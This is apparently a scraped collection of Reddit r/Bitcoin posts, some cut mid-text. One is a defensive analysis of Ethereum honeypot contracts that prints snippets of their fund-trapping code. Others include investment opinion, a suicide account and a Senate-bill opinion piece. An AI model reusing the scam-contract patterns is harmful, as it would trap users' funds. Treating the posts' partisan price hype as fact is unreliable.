any student capable of pushing any of these tasks or projects forward in meaningful ways. We expect this list to grow quickly, as the field of crytpoeconomic primitives seems rich and largely unexplored, and initial progress will lead to more advanced study.### AccreditationOne of the first contracts we will develop in the seminars is an accreditation contract. The logic will be very simple, as will the application process.To become accredited, one must independently make significant progress on a pre-approved cryptoeconomic primitive. More details on the accreditation process and policy will be announced next week.### Interested?- If you'd like a chance to attend the seminars live, respond to my comment below asking for seminar timing preferences.

I've also been wanting to contribute to the ethereum community more and so I thought this would be a perfect opportunity to do a little write up that would go over the details of some of these contracts. There will be a bit of code in this post, though nothing too complex. Hopefully this will serve as an educational piece, but bear with me as I don't often write posts.### Dividend Distributorhttps://etherscan.io/address/0x858c9eaf3ace37d2bedb4a1eb6b8805ffe801bba#codeThis smart contract takes advantage of a Solidity compiler bug detailed here:  https://etherscan.io/solcbuginfo?a=SkipEmptyStringLiteral. This bug results in skipping the empty string literal `''` when passed in as a function argument. Here's the code for the function of interest:         function divest(uint amount) public {        if ( investors[msg.sender].investment == 0 || amount == 0)            throw;        // no need to test, this will throw if amount > investment        investors[msg.sender].investment -= amount;        sumInvested -= amount;         this.loggedTransfer(amount, '', msg.sender, owner);    }    Any investor trying to divest will be in for a rude awakening when their ether is transferred to the owner's address. The bug results in this line of code `this.loggedTransfer(amount, '', msg.sender, owner)` being translated to `this.loggedTransfer(amount, msg.sender, owner)` and so the owner is the true recipient. ### Private Bankhttps://etherscan.io/address/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12#codeThis contract makes use of the same bug found in the infamous DAO hack. Here's the code of interest:    if(msg.sender.call.value(_am)()) {        balances[msg.sender] -= _am;        TransferLog.AddMessage(msg.sender, _am, 'CashOut');    }For anyone not familiar with the interworkings of the DAO hack, the line `msg.sender.call.value` sends the remaining gas with the `call` function, whereas `msg.sender.send(value)` only sends a fixed stipend of 2300 gas. Normally, `msg.sender` would be a typical wallet address, but in the case where it is a smart contract address the fallback function is invoked. The key here is that the ether being sent is not subtracted from the balance until *after* it is sent. If it was subtracted before, this recursive attack would not work. So all the fallback function has to do is call the `withdraw` function and add in logic to make sure it doesn't take more ether than the contract holds.So what's wrong here? The answer lies in the `TransferLog.AddMessage` call. You may have noticed that the Log contract source was posted to etherscan, only that wasn't the real source code. Notice how the contstructor of PrivateBank sets the address of the real Log contract. All the creator of this contract had to do was make sure that the real Log contract had a function with the same signature as the `AddMessage` function posted. The real source code probably looks something like:     function AddMessage(address _sender, uint256 _amount, string _message) {        // note that this is not valid solidity        require(_sender == owner || _message == 'Deposit');        // and so on ...     }This translates to: if the sender isn't me or someone isn't depositing ether then fail, which will revert all state changes, thus never allowing you to withdraw your ether.### Open Address Lottery https://etherscan.io/address/0xd1915A2bCC4B77794d64c4e483E43444193373Fa#codeThis contract scams participants by masquerading as a legitimate lottery, but of course it's not. The malicious code is disguised by a subtle solidity quirk. Take a look at this function:         function forceReseed() { //reseed initiated by the owner - for testing purposes        require(msg.sender==owner);                SeedComponents s;        s.component1 = uint(msg.sender);        s.component2 = uint256(block.blockhash(block.number - 1));        s.component3 = block.difficulty*(uint)(block.coinbase);        s.component4 = tx.gasprice * 7;            reseed(s); //reseed    }You'll notice that an instance of the struct SeedComponent is created. Most programmers, familiar with other popular programming languages, would assume that s is a local instance of the SeedComponent struct ie. it goes on the runtime stack. However, in Solidity any *complex* data type is implicitly a storage pointer unless otherwise specified. This results in component1 pointing to index 0, component2 pointing to index 1, and so forth. The `LuckyNumber` variable lives at index 3 and is assigned the value of `tx.gasprice * 7`. This makes it impossible to win, as the winner is selected via a function that looks like `NotSoRandomNumber % 2`.Here the owner calls the `forceReseed` function:https://etherscan.io/tx/0xf554329a9b949b408d9c75614261ae48d38c818a3f4df970cfeef7f48c2238c4And here's documentation outlining this quirk (it's pretty easy to gloss over it):http://solidity.readthedocs.io/en/develop/types.html### New Years Gifthttps://etherscan.io/address/0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B#codeThis contract takes advantage of a small flaw in a third party resource that many of us use, etherscan. The flaw being that etherscan doesn't show contract A calling functions from contract B as a transaction under contracts B's history, making it easy to obfuscate function calls. Basically, this contract works by allowing the user to set the `hashPass` only if `passHasBeenSet` is false. Anyone who knows the input that produced the value of `hashPass` can claim the funds of this contract by calling `GetGift`. Of course, the storage variable `passHasBeenSet` is private and therefore not readable via etherscan. Luckily, we can use web3 and check the value of the variable ourselves:     > web3.eth.getStorageAt('0x13c547Ff0888A0A876E6F1304eaeFE9E6E06FC4B', 1)    < '0x00000000000000000000008ca354f7e84881157bdbc36d8c40d5b5077621b601'Note that `sender` and `passHasBeenSet` belong to the same storage slot since addresses take up 20 bytes and booleans take up 1 byte (storage slots are 32 bytes). Therefore the last two characters belong to `passHasBeenSet`, which has a value of 01 -> true.On a side note, I've contacted etherscan about this issue and I imagine they will fix this at some point - which reminds me; a friend of mine recently contacted etherscan about another *flaw* where the contract source code wasn't being wrapped. Someone posted a very similar honeypot to this one where there was code being prefixed by a ridiculous number of spaces resulting in the code being rendered off screen (unless you happened to see the tiny horizontal scrollbar and scrolled over). Etherscan has since fixed this issue, in a timely matter too. ### SummaryIf anything, I hope this has been an entertaining read.

Despite little attention being given to digital currencies during the hearing, bill S.1241 itself would amend the definition of financial institution' in the United States Code to include digital currencies and digital exchanges. This could have alarming consequences for users of cryptocurrencies both in the US and abroad.Bill S.1241 would amend the definition of financial institution,' in Section 5312(a) of title 31, United States Code, to include an issuer, redeemer, or cashier of prepaid access devices, digital currency, or any digital exchanger or tumbler of digital currency. Currently, the definition of financial institution' includes banks, trust companies, credit unions, currency exchanges, etc.In her introduction, Mrs. Feinstein, Ranking Member of the Judiciary Committee, said (31:35), The bill criminalizes intentionally concealing ownership or control of a bank account. Although, during the hearing, no further clarifications were given as to the effects this would have on the cryptocurrency community, based on the amended definition of financial institution', it seems clear enough that the bill would criminalize [those] intentionally concealing ownership or control of a [digital currency or digital exchange] account. Wow. Let this sink in for a minuteThe US senate is proposing a bill to make criminals out of anyone intentionally concealing ownership or control of a digital currency or digital exchange account. What's more, according to the hearing's prolonged discussion of US law enforcement's handling of foreign banks and financial institutions, this bill is certain to have far-reaching effects on not only US citizens but the global community as a whole.If the above statement describes you, it is strongly recommended that you watch the hearing with this new definition of financial institution' in mind. If you've already watched the hearing, watch it again, but this time replace all mentions of banks and financial institutions' with digital currencies and digital exchanges.' The implications are really rather alarming.Interestingly enough, Ms. Kathryn Haun Rodriguez, a Coinbase Board of Directors Member, made absolutely no mention of digital currencies or digital exchanges in her testimony; nor was she asked any questions pertaining to these topics.Conversely, in her July 2017 written testimony to the US House of Representatives Committee on Financial Services and Subcommittee on Terrorism and Illicit Finance, she stated that some users of digital currencies use them to conceal and move illicit proceeds because of the perception that virtual currency is untraceable.Also in her prior written testimony, she stated that the FinTech industry could be a very helpful partner to the government in addressing national security concerns; that investigators like digital footprints and that is exactly what digital currencies provide; and that of course, we can only follow the money to an individual or group if they used a Regulated exchange, one that follows basic AML/KYC laws. AdvertisementContrary to the bill itself, the hearing was noticeably lacking in references to cryptocurrencies; although there was some limited mention of such.Ms. Klobuchar (2:16:58):Is this transition we're seeing from cash to digital going to make it easier or harder for law enforcement to track these money laundering cases, and you think these drug cartels are gonna start going cash free, and what do you do about it?Mr. John A. Cassara (2:17:15):Senator, I'm just glad I had my career when I did because I don't know what I'd do trying to follow the money when it comes to digital currencies, it's extremely, extremely challengingI think if you look at the metrics, the metrics suggest today [that] digital currencies are a small fraction of the threat that we face. That's not to say it's gonna be the case in 5-10 years from now. We're right at a crossroads, and it's going to be very, very interesting to see what goes forward.Due to the probable negative implications for the global cryptocurrency community, hopefully the interpretation of bill S.1241 in this article is proven incorrect; however, at this point, it seems fairly clear (at least to me, the author) that this is the intent behind the bill. If this is indeed the case, it will be the most recent attack on a growing list of State-backed attacks against the crypto-community.Furthermore, from the noticeable lack of references made to digital currencies during the hearing, it would appear this bill is yet another underhanded attempt of the US Government to further erode global freedoms and civil liberties, which markedly began with the introduction of the Patriot Act, shortly after the 9/11 attacks.As Tone Vayes mentioned, it would have been nice if Andreas Antonopoulos was there to impart some of the wisdom he shared with the Canadian Senate, on October 8, 2014.Tone Vayes' summation*: It's badI think it's gonna end in a very confrontational way between Bitcoin‚Äîeven Bitcoin holders and users‚Äîand the US Government.Jimmy Song's summation*: Yeah, the nice thing about laws is they take a long timeIndeed it will be very, very interesting to see what goes forward. If this bill passes, how many of you future criminals out there are still set on hodling?*to be fair, neither had yet watched the entire hearing.Full Disclosure: Landon Mutch is a contributor to the Lightning Network, a layer-two Bitcoin protocol, also BTCManager is scamming it's writers and not paying them :(.",False,Us Senate Bill S.1241 to criminalize concealed ownership of Bitcoin,u/[deleted],1,13955,0.91,https://www.reddit.com/r/Bitcoin/comments/7iey6q/us_senate_bill_s1241_to_criminalize_concealed/,[]

The Bitcoin price is on an unbelievably ridiculous upswing which is rather likely to be a bubble. If you're trying to get rich quick by dumping your retirement funds into BTC at $10k, then your 'investment strategy' is not much better than someone betting everything on a game of roulette. High-risk-high-reward investing is not *necessarily* bad, but you have to seriously look at your thought process to make sure that you're not:* Being blinded by dreams of getting rich quickly, similarly to people who dump money on very-negative-EV lottery tickets.* Getting wrapped up in 'HODL' memes, reddit comments, and other groupthink, which is sometimes fun, **but absolutely the last appropriate source of investment advice**.* Acting based on panic thinking like, 'OMG the price is going to $1 million and I will *miss my chance forever* if I don't buy *right now*' or 'OMG the price is going to $0.01 and I will *miss my chance forever* to retain some value if I don't sell *right now*'.* Investing more than you can afford to lose. **Bitcoin is HIGHLY, HIGHLY speculative**. No investment advisor would tell you to put all of your life savings into MSFT or whatever, and MSFT has a market cap 4x larger than Bitcoin. Although I *believe* that it is very unlikely, there are several ways in which the value could drop precipitously, even to zero. For example, there is *no mathematical proof* that the cryptographic algorithms used in Bitcoin are actually secure -- they are merely *believed* to be secure because nobody has been able to break them after many years of intense scrutiny. (I'm not here recommending 'diversifying' into altcoins -- altcoins are almost all complete trash, and price-wise they follow BTC but with even more volatility, so they're not really useful for diversification.)It is entirely possible that the massive price increase of the last year is based on lasting fundamentals. In addition to things like the fairly recent subsidy halving, the defeat of B2X, etc., the world fiat-based economy is in many ways on very shaky ground, and getting worse all the time. There are many good reasons why BTC should have a larger market cap than every fiat currency combined. It's even possible that the price will increase quite a bit more from now. But for goodness sake, don't think that Bitcoin is the first-ever infinite-money generator that will continue to rise exponentially forever (in real terms). I can nearly guarantee that **there will be a large and long-lasting crash/downturn at some point**. Maybe it will be $10k to $5k, maybe it will be $50k to $30k, who knows. But if you're thinking for example that the current $5k+ price range is *absolutely secure* after only existing for a few months, then you're traveling blind through very dangerous territory.Some points to consider:* Buying near the ATH is very risky, and while it *can* be correct/profitable, it puts you on the wrong footing. You need to buy *low* and sell *high* to make money.* On 2013-11-29 (exactly 4 years ago) the peak ATH hit $1163, and then fell to $152 by 2015-01-13. That's a drop of 86.9%. Imagine this happens again: The price drops sharply to $2000 or something and then just continuously decreases down to a low of $1,432 (an 86.9% reduction from today's ATH) over the course of a *whole year*. I'm not saying that this *will* happen, but it's happened once and it *can* happen again. **Could you survive this?*** Bitcoin is experimental, and it is probably imprudent for someone who is not a true believer in the *soul* of Bitcoin to invest a lot into it. For example, I personally wouldn't invest more than a few percent of my total assets into ETH even if I felt very confident that it would rise in price because I simply don't believe in its philosophy or long-term value.* To reduce risk, it is frequently recommended to allocate assets by percentage, and rebalance upon large price movements. Eg. If you previously decided that you want to allocate 50% of your wealth in BTC (because you are a super big true believer), but BTC is now 90% of your wealth because the price increased so much, it may generally be advisable to start selling to rebalance your BTC allocation back down to 50%. I'm not saying that it is always absolutely wrong to have 90% of your assets in BTC or whatever, but it should be because you are intentionally *choosing* to do so, not because the price got away from you and you never really considered that you now have 90% of your wealth riding on one thing.* Avoid panic buys and panic sells. Dollar-cost-averaging over a long period of time is often a good strategy.* Nothing rises in real value to infinity. That's impossible. It is possible that 1 BTC could someday be worth infinite *dollars*, but that just means that dollars are worthless in that hypothetical scenario. BTC probably does have plenty of room to grow in real value before it completely takes over the world, but keep in mind that there *is* a ceiling.* If BTC were to reach values like $100k-$250k, that'd probably cause/imply that the prevailing economic regime has completely fallen apart. At some point in that price area, people around the world would probably lose substantial faith in fiat currencies. A good result, but ask yourself: do you expect the prevailing economic regime to *go down easily*?I'm not telling you to buy or sell, and I'm not giving financial advice here. I'm just urging everyone to think rationally, not emotionally or recklessly.",False,Don't invest recklessly,u/[deleted],10,13887,0.98,https://www.reddit.com/r/Bitcoin/comments/7gi55s/dont_invest_recklessly/,[]

I later set up a weekly buy on Coinbase buying the majority of my coins between $200 to $400. My original goal back then was to accumulate 21 BTC and be in the million club. I turned it off in 2015 once I was well over 21 coins. Of course looking back I wish I had never turned it off.**So why did I sell?** The value is now enough that I can pay my capital gains and still have enough to pay off my house leaving me completely debt free. I found myself constantly stressing over the fact I was storing close to 200K and I also fully expect a pull back at some point soon. Once my house is paid off I will most likely start buying back in again using money that would have been going towards a house payment.**Things I learned**  **Test your recovery process.** If you have a hardware wallet (and you should) send a small amount of crypto to it then wipe it and reload it using your seed. This made me much more confident using the wallet once I had done this and knew that recovery was pretty simple. Also use a passphrase, but make sure it is one you will never forget.**Store your seed securely.** I used a metal stamp to punch my seed into a ¬º inch steel plate. After that I dipped it in plastisol so it cannot be read and stored it in my safe with a description written on the outside. I also had another copy of the seed stored behind a picture at a trusted family member's house just in case.**Sending a BTC transaction for tens of thousands of dollars is extremely stressful.** I first moved my coins from Coinbase to a hardware wallet before the BCH fork (yes, I was stupid and stored them on an exchange, although I did use their cold storage feature so there was a waiting period before they could be moved if my account was compromised). It was a long 15 minutes before the transaction showed up on the blockchain (I think Coinbase batches transactions up before sending) so I was freaking out that I had done something wrong and all my coins were gone. I wanted to save on transaction fees, but I should have moved them in smaller increments.**Weekly buys and dollar cost averaging is the way to buy.** I never had to think about the weekly buy so it was worth the small amount I paid for fees. Over time I was able to build a substantial sum.**It takes a long time to get out due to limits.** I was limited to 10K withdrawal per day so it is taking a while to transition to fiat. I applied for an increase but it was denied for some reason. I am pretty happy with Coinbase, but they are obviously dealing with growing pains. After withdrawing around 50K they quit letting me withdraw and said I needed to do some more verification. I tried uploading my license but the verification kept failing with a blank error message. I submitted a support ticket and heard nothing for several days. I finally remembered that they had recently added phone support so found the number and called. I only had to wait about 10 minutes until I talked to someone and they were very helpful. It turns out I was supposed to be prompted to use a web cam to take a selfie after uploading my license. Once I found that out I did it on my laptop that has a camera and was verified within 5 minutes. I had no problems with withdrawals after that.**Capital gains suck.** I took all the risk of buying into crypto yet I am going to be on the hook for close to 30K to the government for my long term gains. There is no way I am fucking around with the IRS though, so I will happily pay them. I still have some other crypto and will most likely start buying back in again in a few months. In a few years when I retire I will most likely try to live off of 37.5K income per year from selling crypto so I do not have to pay those capital gains. After a few years of that I will dip into my traditional retirement accounts. I still need to find out if I need to pay an estimated tax payment this quarter to avoid a penalty for not having enough taken out of my paycheck to cover my taxes for the year.My hat is off to those that are still hodling. It has already gone up quite a bit since I sold. I might look back at selling and kick myself in the future, but right now the thought of being debt free is pretty liberating. **It has been one fucking hell of a ride and I will be back on the coaster with the rest of you soon!**",False,"Guys, I am out",u/[deleted],2,12870,0.88,https://www.reddit.com/r/Bitcoin/comments/7fvoxh/guys_i_am_out/,[]

It's a debilitating illness usually affecting people who are _already_ victims, like sexual assault survivors who still suffer and are tormented every day since. Not only do they experience traumatic flashbacks, even sleep is no relief thanks to serious nightmares. It is life threatening. Existing treatment for PTSD aren't great. Therapy can be helpful, but they're often not enough, especially for severe PTSD. There are only two drugs approved by the FDA: SSRIs like Zoloft and Paxil. Those drugs must be taken continuously, and can cause serious side effects. Mania, seizures, inability to orgasm, and suicide are known side effects.In 1986, a nonprofit named MAPS was started to develop legal contexts for beneficial uses of psychedelics and marijuana. 31 years later, MAPS has found its most promising candidate yet: MDMA-assisted psychotherapy as a treatment for PTSD. # The numbers: 68% (MDMA) versus 25% (placebo)They've already conducted Phase 2 studies in the US, Canada, Israel, and Switzerland. After a comprehensive therapeutic process involving preparatory sessions, MDMA-assisted therapy sessions, and non-drug therapy sessions, **61% no longer met the criteria for PTSD**. This improved to **68%** after a year. Of those who met the criteria, many experienced significant reductions in symptoms. This is compared to only 25% for the placebo group, who received all the therapy, but with a sugar pill instead of MDMA.For most people, the benefits are lasting. MAPS conducted one long-term outcome study, evaluating patients ~3.5 years after the last MDMA-assisted sessions. Average benefits even increased slightly over time.> 'The MDMA sessions were the first time I'd ever felt love for myself. It was the first time I'd ever felt happy. I hugged my therapist and said 'Thank you.''After MAPS' studies, the FDA granted ['Breakthrough Therapy Designation'](https://www.maps.org/news/media/6786-press-release-fda-grants-breakthrough-therapy-designation-for-mdma-assisted-psychotherapy-for-ptsd,-agrees-on-special-protocol-assessment-for-phase-3-trials) to MDMA-assisted psychotherapy.Now they need to conduct Phase 3 trials, which are far costlier due to requirements for an increased sample size, groups, etc, even through the stage with highest failure rates (Phase 2) is already over. MAPS has achieved the extra-ordinary journey of bringing MDMA-assisted psychotherapy all the way to Phase 3; a drug that pharmas will never touch because it will disrupt their recurring revenue streams of SSRIs.# Phase 3Phase 3 will cost about $25 million. They've raised $17 million already ($1 mil from PF included), and need another $8 million to get to the finish line. I have never donated to MAPS (or even heard of them) before starting the Pineapple Fund. PF donated $1 million, and that inspired another anonymous donator to **give another $1 million** in bitcoin. To whoever you are, you're amazing, and you are inspiring. <3**I believe we, the cryptocurrency community, can fully fund Phase 3 trials**. Prescription MDMA could be a gift to this world from the bitcoin community.If the trial succeeds, it could be approved as early as 2021. MAPS has created a public benefit corporation, fully owned by the non-profit, that would sell MDMA post-approval. This is a scalable and **financially sustainable** structure that could kickstart a renaissance in research into the therapeutic applications of many different psychedelics.**Pineapple Fund will double the value of every donation to MAPS** from today until March 10th, up to $4 million. You can donate with bitcoin. It's like donating bitcoin for $30,000 each!http://www.maps.org/donate-redirect/cryptocurrencyYou can also donate with legacy payment systems like [credit cards or PayPal](https://store.maps.org/np/clients/maps/donation.jsp?campaign=103), and PF will also match that donation.Your donations are tax deductible (if you're a US taxpayer), and you don't even have to pay capital gains tax. Ask for a receipt if so.Let's make MDMA medicine a reality, and give the gift of an enjoyable life to those suffering from PTSD.

Sometime in 2013 he claimed to have lost most of them in a hack and sold the remainder too early. He very well may have sold them all too early, but who knows. As the price took off in late 2013-early 2014 you could tell he was distraught over it and became increasingly withdrawn from family and friends. Whenever I did manage to contact him he would sometimes end up ranting about how badly he had fucked up and how he would never have a chance to be rich again.As the price climbed up to 10k over the past several months it became even more difficult to make contact with him, he just wouldn't reply to me or my parents calls and texts. A couple weeks ago my parents flew out to see my brother and found him dead by suicide with no note. He was 29 with 50 years of life ahead of him.Other than obvious grief I don't really know how to feel about this. If I had missed out on $50M I might have killed myself too. I can't imagine what my brother must have been feeling these past several years knowing he missed his best & easiest shot at the wealthy life he had always fantasized about. Bitcoin totally fucked up his mindset to the point where you couldn't talk about anything related to investing, money or finances without him storming off or crying.If there's any more of you in a similar situation feel free to PM me. Please try to recognize there are endless economic opportunities in life and 1 mistake doesn't define your future. There are family and friends who care about you and will listen.",False,My brother killed himself because of BTC,u/[deleted],4,8906,0.85,https://www.reddit.com/r/Bitcoin/comments/7hmjdw/my_brother_killed_himself_because_of_btc/,[]

For all those who have had positive experiences with Coinbase- that's great, but don't assume it will not happen to you at some point, especially when liquidity goes to hell after a crash.  If they can't help a newer customer willing to put in a large amount of funds, why will they help those who put in less. No, I did not deposit this amount without depositing a smaller amount first, which went through, so assumed the systems were fine, and hey worst case the wire is rejected ....  WRONG.  Don't assume it won't happen to you!!  Yes I filed a CFPB and state Financial Institutions complaint.  Yes I called a zillion times.

If they follow through, it will be confirmation that it truly is a manpower issue with Coinbase/ GDAX, and should be very encouraging to all with funds transfer problems.   I will update this post when/if funds are actually received back.** UPDATE**:  Day #37- No funds received.  Received the Consumer Finance Protection Bureau response back today, Coinbase stated the following: 'Company's ResponseHello Mr. ###, I am sorry for the recent troubles with your wire transfer and also the delay of an agent getting back to you. An agent was able to reach out to you via case ### regarding your issue. There was an issue processing the return of your wire, but another team looked into it and had the funds sent back to your bank.

We haven't even seen the tip of the iceberg. Even in 2013, people would say 'Those that bought in 2012 were so lucky, we are too late.  We'll just get the scraps.' Same for 2017. You wish you bought when it was cheap, but would you? Probably not. Why didn't you buy more when it dropped to $4K last year? Would you have held if your money tripled or quadrupled?Everyone has been telling me it is too late since 2013. 99% of my friends didn't buy at $200, or $2000, or $20,000 per BTC because it was 'too late'. Don't make the same mistake. It's not too late, Bitcoin isn't even a teenager yet, it's only 12 years old.**Lesson 2:** Stop thinking about the 50 BTC you lost on satoshi dice (yeah, coins were cheap back then), or the 5 BTC for that bag of herb that you smoked (or that acid you took). It's gone. Stop thinking you should have sold at $20K and bought back in at $3K instead of hodling all the way down and capitulating to buy at $1.8K. Stop thinking you can time the dips, and sell the tops. Stop regretting not buying earlier.In short, stop fantasizing about what you could have done in the past and start thinking about today and the future. This is the mindset you should have:*What should I do today, so that tomorrow, I won't regret yesterday?*'Buy Bitcoin' is the right answer, by the way.**Lesson 3:** Building things will require a lot of sacrifice. I would have way more BTC if I didn't start a Bitcoin startup in the Philippines back in 2014. 7 years in this industry feels like 70! I grew many white hairs in the last 7 years. I know many people who have the same experience -- those who would be wealthier and more relaxed today had they just bought Bitcoin and Hodled instead of building stuff. But at the end of the day, you can still accumulate AND build. Again, it is not too late, even at this stage. Stack sats while building stuff! And always remember that the backbone of this industry are the tens of thousands of people out there, building stuff to make Bitcoin WORK, to make Bitcoin accessible. This isn't some vaporware with no backing - it is backed by human ingenuity and the blood, sweat, and tears of all the startups and companies out there making sure this thing survives and thrives.**Lesson 4:** Bitcoin will keep surprising us. Don't believe people who tell you they know what will happen. When you think it is time to sell because you'll be able to buy cheaper later, it will break out and up. When you think we will never see X price again we'll see it again. When people say this is is, this is the peak, it won't be the peak. Be prepared for faces to melt and minds to crumble into madness from disbelief at what Bitcoin will achieve. *There is no army in the world that can stop an idea whose time has come.***Lesson 5:** Bitcoin is a remarkable phenomenon, a once in a generation opportunity to participate in the evolution of how we move value around the world. Anyone that tells you otherwise is either ignorant or trying to deceive you. This network has gone through the most crucial tests of pressure and time that make it anti-fragile. Pressure and time, that's really all it takes. Everything else will be built around this bedrock foundation.**Lesson 6:** Mass adoption is a myth. Bitcoin doesn't need 'mass adoption'. More like, mass adoption needs Bitcoin. It only needs a small % of the world's wealth to get there. Bitcoin makes no promises other than to reliably and consistently create new publicly verifiable blocks of immutable transactions every ten minutes. This is all it needs to keep doing consistently and securely for its value to increase exponentially over time. Everything else is gravy.**Lesson 7:** We still have at least another decade of this crazy rollercoaster ride before Bitcoin starts to get even slightly boring. Just strap in and enjoy it.**Lesson 8:** Make some friends along the way. Make enemies if need be. I've made lifelong connections and relationships in the last 8 years in this industry. I have had a dedicated Buttcoiner hate group that created fake accounts similar to my name to try and embarrass me. Fake accounts, phishing, hacks, personal attacks. I don't give a fuck. And like I keep saying, we've only just begun.A lot of the people you meet today will be playing huge roles in this industry in the near future. You'll be in good company when the time comes. At the end of the day, life is all about the relationships you make along the way. Make sure they're meaningful ones.Most of the friends I made since 2013 who have stuck around are already wealthy beyond their wildest dreams, and they're still sticking around, giving back, helping others, helping their communities, doing awesome shit.**Lesson 9:** Do watch out for snakes and wolves disguised as people. Been scammed, lied to, stolen from, used, abused, harassed, you name it. There are a lot of bad actors out there, hiding behind smiling faces. They want what's yours and will go through great lengths to get it. Don't let anyone tell you different. These people will stab you in the back, slit your throat, take everything, and leave you out in the alley talking to yourself about what the fuck just happened. If you don't believe me, then you're the lamb that's going off to the slaughter.**Lesson 10:** Take it easy. It's easy to get caught up in all the hype, to want all that attention. It's easy to get lost in the confidence of a bull market and the despair of a bear market. Step back and try to gain the peace of a lofty perspective. When you've been in the Bitcoin game for a while, you gain a certain peace. A relaxed comfort. Eyes open, ears open, radar up. Absorbing every message. Taking everything as it comes. Not mixing what they really are with what you want them to be. It's like an aerial view.A view from above the myriad luck-dependent reactions of those who never gain such a peace. And when you gain that view, that peace - when you'd rather have the truth, no matter how disappointing, over a false hope, no matter how desirable - then you will finally understand the true meaning of hodling Bitcoin.See you guys in another 8 years.-------Edit: *Wrote this two years ago, edited it a bit to reflect certain recent developments.

Difficult to transport. Difficult to divide.*	Paper money was invented. A claim to gold in a bank vault. Easier to transport and divide.*	Banks gave out more paper money than they had gold in the vault. They ran fractional reserves. A real money maker. But every now and then, banks collapsed because of runs on the bank.*	Central banking was invented. Central banks would be lenders of last resort. Runs on the bank were thus mitigated by banks guaranteeing each other's deposits through a central bank. The risk of a bank run was not lowered. Its frequency was diminished and its impact was increased. After all, banks remained basically insolvent in this fractional reserve scheme.*	Banks would still get in trouble. But now, if one bank got in sufficient trouble, they would all be in trouble at the same time. Governments would have to step in to save them. *	All ties between the financial system and gold were severed in 1971 when Nixon decided that the USD would no longer be exchangeable for a fixed amount of gold. This exacerbated the problem, because there was now effectively no limit anymore on the amount of paper money that banks could create. *	From this moment on, all money was created as credit. Money ceased to be supported by an asset. When you take out a loan, money is created and lent to you. Banks expect this freshly minted money to be returned to them with interest. Sure, banks need to keep adequate reserves. But these reserves basically consist of the same credit-based money. And reserves are much lower than the loans they make. *	This led to an explosion in the money supply. The Federal Reserve stopped reporting M3 in 2006. But the ECB currently reports a yearly increase in the supply of the euro of about 5%.*	This leads to a yearly increase in prices. The price increase is somewhat lower than the increase in the money supply. This is because of increased productivity. Society gets better at producing stuff cheaper all the time. So, in absence of money creation you would expect prices to drop every year. That they don't is the effect of money creation.*	What remains is an inflation rate in the 2% range.*	Banks have discovered that they can siphon off all the productivity increase + 2% every year, without people complaining too much. They accomplish this currently by increasing the money supply by 5% per year, getting this money returned to them at an interest.*	Apart from this insidious tax on society, banks take society hostage every couple of years. In case of a financial crisis, banks need bailouts or the system will collapse.*	Apart from these problems, banks and governments are now striving to do away with cash. This would mean that no two free men would be able to exchange money without intermediation by a bank. If you believe that to transact with others is a fundamental right, this should scare you.*	The absence of sound money was at the root of the problem. We were force-fed paper money because there were no good alternatives. Gold and silver remain difficult to use.*	When it was tried to launch a private currency backed by precious metals (Liberty dollar), this initiative was shut down because it undermined the U.S. currency system. Apparently, a currency alternative could only thrive if nobody launched it and if they was no central point of failure. *	What was needed was a peer-to-peer electronic cash system. This was what Satoshi Nakamoto described in 2008. It was a response to all the problems described above. That is why he labeled the genesis block with the text: 03/Jan/2009 Chancellor on brink of second bailout for banks.. Bitcoin was meant to be an alternative to our current financial system.So, if you find yourself religiously checking some cryptocurrency's price, or bogged down in discussions about the one true bitcoin, or constantly asking what currency to buy, please at least remember that we have bigger fish to fry.We are here to fix the financial system.Edit: wow, thanks for the gold!",False,Just a quick reminder why Bitcoin was invented in the first place.

Just as with anything else in life, **trading cryptocurrencies is context dependent**. That means you should remain a healthy sceptic about general truths, universal rules and things that 'everyone knows'. Consider the famous 'buy low sell high' dictum. The definition of high and low is subjective in most cases since it depends on your timescale, goals and trading strategy. If you're a hodler, as are many of the fellow redditors here, your high and low will differ dramatically compared to the day trader's.2. It is for the same reason that **bulls and bears don't really matter**. Whether you're 'bullish' or 'bearish' depends on your strategy and timescale. Consider this: to someone hodling BTC since 2013 a dip here or there (even a prolonged one) makes little difference because the price of BTC over the time continues to grow monstrously ‚Äì you can call it one long-term bull market.3. At some point, you'll bump (or you already have) into something that is called 'technical analysis'. Let me save you some time (and money, probably) by telling you this: **technical analysis is neither technical, nor is it very analytical**. While many traders regard TA to be a scientific way (supposedly based on mathematics) to read and predict the market moves, TA has little to do with any formal science. Differently from the surrounding physical world, we are not aware of any physical laws that govern our human behavior, including markets. If it was possible to mathematically calculate and with certainty predict market moves, the big buck guys in Wall Street would have already done it. Think about the major financial crises for a moment ‚Äì just like the Spanish Inquisition, nobody (well, almost nobody) ever expected one. Does it mean TA ‚Äì  trends, chart patterns, MACD, RSI, Elliot wave count, etc. ‚Äì is a complete rubbish? I wouldn't go as far as to claim that. It is somewhat helpful ‚Äì if only a little, TA still gives you a feel of the current market mood. TA also does one other thing pretty accurately: it graphically represents historic data of human behavior in the financial markets. Surely you can benefit from that? Or do you? This brings me to another point...4. **Beware of historical analogies and 'I knew it all along' thing**. As humans, we are prone to hindsight bias, a tendency, after an event has occurred, to see it as having been easily predictable. We are all blinded by hindsight bias because our brain looks for simplistic linear link between cause and effect. This way when an unexpected event happens, the brain uses the knew-it-all-along mode to cope with cognitive dissonance and make sense of the surrounding world. While trading hindsight bias harms you in two ways: a) it drains you psychologically for not making 'the right' decisions in the past, and by luring you into oversimplified historic analogies, b) it creates a false sense of investment security at the present time. Just look at everyone complaining they've sold their BTC at the worst possible time (as a matter of fact, I am no different ‚Äì I still autodestructively loathe my decision to liquidate a large portion of my BTC portfolio after the BTC price hiked to 8k). It is also very tempting to think you wouldn't miss 'the next bitcoin'. The problem is, though, that it is incredibly difficult if at all possible to spot such an opportunity. You have to be either lucky or extremely well informed (and lucky) to capitalize early on such opportunity. In reality, it's very difficult to differentiate between useless information (noise) and something that truly matters (signal). Which brings me yet to another point...5. **Stop being a news junkie and start filtering what you read/hear/see**. If you don't, at some point in time the quantity of consumed news will start to impact your decisions and it will begin to negatively correlate with the net gain of your investment portfolio. Instead of reading news nonstop, better educate yourself ‚Äì dive deep into the market fundamentals and the technology you're dealing with. This way it will be easier for you to spot new lucrative investment opportunities when the time comes.6. **Accept the fact that idiots also happen to make lots of money and move on**. Multiple times too, if they're lucky ones. However, the net worth of (lucky) idiot doesn't mean you should imitate him and become one. Some two months ago a Dutch father of two young children sold his family's house, bought BTC and other cryptocurrencies, and relocated his family to a rented property. After the recent spike in BTC price the guy's net worth must have increased substantially. 